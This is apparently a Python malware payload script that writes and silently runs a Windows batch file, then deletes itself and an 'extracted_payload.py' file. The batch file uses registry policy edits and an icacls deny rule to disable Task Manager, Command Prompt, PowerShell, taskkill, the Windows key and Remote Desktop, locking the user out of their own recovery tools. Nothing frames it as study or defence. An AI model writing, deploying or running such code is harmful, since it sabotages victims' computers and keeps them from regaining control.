import tkinter as tk
from tkinter import messagebox
import os
import sys
import subprocess

print("Start Payload")

# The content of the batch file that will be executed with administrator privileges
batch_content = r'''@echo off
:: Check if the script is running as administrator
::NET SESSION >nul 2>&1
::if %errorlevel% neq 0 (
    :: Re-launch the batch script as administrator using PowerShell
    ::powershell -Command "Start-Process cmd -ArgumentList '/c', '%%~f0' -Verb runAs"
    ::exit /b
::)

:: Disable Task Manager
echo Disabling Task Manager...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Disable Command Prompt
echo Disabling Command Prompt...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 2 /f
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f

:: Disable PowerShell
echo Disabling PowerShell...
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisablePowershell /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisablePowershell /t REG_DWORD /d 1 /f

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisallowRun /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 1 /t REG_SZ /d "cmd.exe" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /v 2 /t REG_SZ /d "powershell.exe" /f

:: Prevent taskkill from running (make it read-only)
echo Preventing taskkill.exe from being executed...
icacls "C:\Windows\System32\taskkill.exe" /deny Everyone:(R)

:: Disable Windows Key
echo Disabling Windows Key without restart...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f

:: Refresh Explorer to apply changes immediately
taskkill /im explorer.exe /f >nul 2>&1
start explorer.exe

:: Disable Remote Desktop
echo Disabling Remote Desktop...
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f

gpupdate /force

'''

# Path where the batch file will be created
batch_file = 'admin_script.bat'
print("Just created the bat")

# Create the batch file
with open(batch_file, 'w') as f:
    f.write(batch_content)

def check_cmd_disabled():
    try:
        # Try to run a basic command in Command Prompt
        subprocess.run(["cmd", "/c", "echo Hello, World!"], check=True)
        print("Command Prompt is enabled.")
    except subprocess.CalledProcessError as e:
        print("Command Prompt seems to be disabled.")
    except Exception as e:
        print(f"An error occurred: {e}")


def windows_payload():
    try:
        # subprocess.run(
        #     ["cmd", "/c", "admin_script.bat"],
        #     creationflags=subprocess.CREATE_NO_WINDOW  # Optional: hide the command window
        # )
        subprocess.run(
            ["cmd", "/c", "admin_script.bat"]
        )
        print("Batch file executed successfully!")
    except Exception as e:
        print(f"Error executing batch file: {e}")

    os.remove("./admin_script.bat")
    os.remove("./extracted_payload.py")

windows_payload()
check_cmd_disabled()



